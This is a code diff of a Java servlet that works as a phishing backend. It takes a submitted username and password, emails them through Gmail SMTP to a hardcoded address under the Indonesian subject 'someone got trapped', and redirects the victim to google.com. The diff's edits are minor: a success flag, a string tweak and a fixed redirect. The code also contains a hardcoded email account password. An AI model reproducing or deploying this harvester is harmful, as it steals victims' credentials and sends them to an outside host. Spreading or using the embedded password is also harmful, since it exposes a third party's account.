@@ -18,6 +18,7 @@ public class ProcessRequest  extends HttpServlet{
 	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
 		String nama = req.getParameter("username");
 		String password = req.getParameter("password");
+		boolean success = true; 
 		if (nama != null && password != null) {
 
 			Properties mailServerProperties = System.getProperties();
@@ -30,7 +31,7 @@ public class ProcessRequest  extends HttpServlet{
 			try {
 				generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
 				generateMailMessage.setSubject("Ada yang terjebak");
-				String emailBody = "nama: "  + nama + "|pasword: "+ password;
+				String emailBody = "nama: "  + nama + "| pasword: "+ password;
 				generateMailMessage.setContent(emailBody, "text/html");
 
 				Transport transport = getMailSession.getTransport("smtp");
@@ -38,27 +39,22 @@ public class ProcessRequest  extends HttpServlet{
 				transport.connect("smtp.gmail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
 				transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
 				transport.close();
-				
-				
-
 
 			}catch(Exception e) {
 				System.out.println("mail.sending error"); 
 				e.printStackTrace();
+				success = false; 
 			}
 		}
 
 
 		try {
-			resp.sendRedirect("www.google.com") ;
-		} catch (IOException e) {
+			resp.sendRedirect("http://www.google.com") ;
+//			resp.addHeader("Location" , "www.google.com" );
+		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		
-	}
-
-//	out.println("email berhasil dikirimkan");  
-
-	
+	}	
 }
